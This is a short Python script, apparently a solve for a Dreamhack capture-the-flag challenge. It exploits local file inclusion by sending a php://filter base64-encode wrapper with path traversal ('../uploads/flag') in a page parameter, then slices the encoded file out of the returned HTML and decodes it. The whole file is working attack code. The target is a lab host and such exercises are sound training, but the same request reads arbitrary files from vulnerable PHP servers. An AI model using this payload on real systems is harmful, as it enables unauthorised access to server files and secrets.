import requests, base64

port = 23212
url_index = f"http://host3.dreamhack.games:{port}/"

r = requests.get(
    url_index + "?page=php://filter/convert.base64-encode/resource=../uploads/flag"
)

start = r.text.index('<div class="container">', r.text.index("<br/>"))
end = r.text.index("</div>", start)
encoded_flag = r.text[start + 30 : end - 4]

print(base64.b64decode(encoded_flag).decode("utf-8"))
